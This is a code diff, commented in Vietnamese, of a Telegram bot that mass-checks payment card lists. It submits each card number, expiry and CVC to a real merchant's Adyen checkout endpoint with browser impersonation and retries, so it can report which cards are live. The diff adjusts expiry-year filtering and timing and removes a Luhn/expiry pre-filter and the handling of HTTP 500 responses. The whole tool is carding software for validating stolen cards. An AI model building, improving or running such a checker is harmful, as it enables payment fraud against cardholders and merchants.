@@ -312,8 +312,7 @@ def normalize_card(card_str):
     if len(year) == 2: year = '20' + year
     try:
         year_int = int(year)
-        # Bỏ giới hạn dưới cứng ở đây để cho phép bộ lọc tùy chỉnh xử lý
-        if year_int > 2040: 
+        if year_int < 2024 or year_int > 2040: # Giới hạn năm hợp lý để tránh rác
             return None
     except ValueError: return None
     
@@ -394,46 +393,6 @@ def generate_progress_bar(current, total, length=15):
     bar = "█" * filled_length + "░" * (length - filled_length)
     return f"[{bar}] {int(percent * 100)}%"
 
-# --- HÀM LỌC FILE NÂNG CAO ---
-def filter_invalid_cards(card_list):
-    """
-    Lọc thẻ trước khi check:
-    1. Luhn sai -> Loại
-    2. Năm <= 2025 -> Loại
-    """
-    valid_list = []
-    removed_count = 0
-    
-    for line in card_list:
-        try:
-            parts = line.split('|')
-            if len(parts) != 4:
-                removed_count += 1
-                continue
-            
-            cc, mm, yyyy, cvc = parts
-            
-            # Check Năm <= 2025
-            try:
-                y_int = int(yyyy)
-                if y_int <= 2025:
-                    removed_count += 1
-                    continue
-            except:
-                removed_count += 1
-                continue
-            
-            # Check Luhn
-            if not validate_luhn(cc):
-                removed_count += 1
-                continue
-            
-            valid_list.append(line)
-        except:
-            removed_count += 1
-            
-    return valid_list, removed_count
-
 # ===================================================================
 # === PHẦN 3: XỬ LÝ CARD VÀ THÔNG TIN BIN
 # ===================================================================
@@ -457,9 +416,7 @@ async def check_card_core(line, session_semaphore=None):
     price_val = current_config["price"]
     offer_id = current_config["id"]
 
-    # --- [IMPROVED TIME CHECK] ---
-    # Không khởi tạo start_time ở đây nữa để tránh tính thời gian chờ queue
-    
+    start_time = time.time()
     line = line.strip()
     result = {
         "status": "ERROR",
@@ -471,6 +428,7 @@ async def check_card_core(line, session_semaphore=None):
     if not line: return result
     normalized = normalize_card(line)
     if not normalized: 
+        # Nếu normalize thất bại, trả về lỗi ngay
         return result
         
     cc, mm, yyyy, cvc = normalized.split('|')
@@ -482,16 +440,11 @@ async def check_card_core(line, session_semaphore=None):
 
     if session_semaphore:
         async with session_semaphore:
-            # Chỉ bắt đầu tính giờ bên trong _execute_check
-            return await _execute_check(cc, mm, yyyy, cvc, price_val, offer_id)
+            return await _execute_check(cc, mm, yyyy, cvc, price_val, offer_id, start_time)
     else:
-        return await _execute_check(cc, mm, yyyy, cvc, price_val, offer_id)
+        return await _execute_check(cc, mm, yyyy, cvc, price_val, offer_id, start_time)
 
-async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id):
-    # --- [IMPROVED TIME CHECK] ---
-    # Bắt đầu tính giờ tại đây (khi thread thực sự chạy)
-    start_time = time.time()
-    
+async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id, start_time):
     retry_count = 0
     max_retries = 2
     impersonate_ver = "chrome120"
@@ -564,18 +517,6 @@ async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id):
                 }
 
                 resp_pay = await session.post('https://taongafarm.com/payment/adyen/api/checkout/payment', headers=payment_headers, json=payment_json_data, timeout=20)
-                
-                # === XỬ LÝ LỖI 500 ===
-                if resp_pay.status_code == 500:
-                    end_time = time.time()
-                    time_taken = round(end_time - start_time, 2)
-                    return {
-                        "status": "DECLINED",
-                        "is_live": False,
-                        "full_log": f"{cc}|{mm}|{yyyy}|{cvc}|ERROR|500|Card Not Supported - Time: {time_taken}s",
-                        "bin_info": "UNK"
-                    }
-
                 try:
                     data = resp_pay.json()
                 except:
@@ -622,12 +563,8 @@ async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id):
             retry_count += 1
             await asyncio.sleep(0.5)
             continue
-    
-    # --- [IMPROVED TIME CHECK] ---
-    # Tính thời gian ngay cả khi lỗi timeout để biết proxy chậm thế nào
-    end_time = time.time()
-    time_taken = round(end_time - start_time, 2)
-    return {"status": "ERROR", "is_live": False, "full_log": f"{cc}|{mm}|{yyyy}|{cvc}|ERROR|Timeout or Network Error - Time: {time_taken}s"}
+
+    return {"status": "ERROR", "is_live": False, "full_log": f"{cc}|{mm}|{yyyy}|{cvc}|ERROR|Timeout or Network Error"}
 
 # ===================================================================
 # === PHẦN 4: LOGIC XỬ LÝ HÀNG LOẠT (NON-BLOCKING)
@@ -884,16 +821,9 @@ async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("⚠️ Không tìm thấy thẻ hợp lệ.")
             return
         
-        # === [UPDATED] ÁP DỤNG LỌC KHI MASS TEXT ===
-        valid_cards, removed_count = filter_invalid_cards(cards)
-        
-        if len(valid_cards) == 0:
-            await update.message.reply_text(f"⚠️ Tất cả {len(cards)} thẻ đều không hợp lệ (Lỗi Luhn hoặc Hết hạn <= 2025).")
-            return
-
-        msg_text = f"🚀 Đã nhận {len(cards)} thẻ.\n🗑️ Lọc bỏ: {removed_count} (Lỗi/Exp <= 2025)\n✅ Còn lại: {len(valid_cards)} thẻ.\n⏳ Bắt đầu chạy ngầm..."
-        await update.message.reply_text(msg_text)
-        asyncio.create_task(process_card_list(update, context, valid_cards))
+        # FIX: Dùng create_task để chạy ngầm, không block bot
+        await update.message.reply_text(f"🚀 Đã nhận {len(cards)} thẻ. Quá trình check sẽ chạy ngầm...")
+        asyncio.create_task(process_card_list(update, context, cards))
         
     except Exception as e:
         await update.message.reply_text(f"Lỗi Mass: {str(e)}")
@@ -910,17 +840,9 @@ async def file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     cards = extract_cards_from_text(full_text)
     
-    # === [UPDATED] ÁP DỤNG LỌC FILE ===
-    valid_cards, removed_count = filter_invalid_cards(cards)
-    
-    if len(valid_cards) == 0:
-        await update.message.reply_text(f"⚠️ File chứa {len(cards)} thẻ nhưng tất cả đều không hợp lệ (Lỗi Luhn hoặc Hết hạn <= 2025).")
-        return
-    
-    msg_text = f"📂 Đã nhận file {len(cards)} thẻ.\n🗑️ Lọc bỏ: {removed_count} (Lỗi/Exp <= 2025)\n✅ Còn lại: {len(valid_cards)} thẻ.\n⏳ Bắt đầu chạy ngầm..."
-    await update.message.reply_text(msg_text)
-    
-    asyncio.create_task(process_card_list(update, context, valid_cards))
+    # FIX: Dùng create_task để chạy ngầm
+    await update.message.reply_text(f"🚀 Đã nhận file {len(cards)} thẻ. Quá trình check sẽ chạy ngầm...")
+    asyncio.create_task(process_card_list(update, context, cards))
 
 # ===================================================================
 # === MAIN
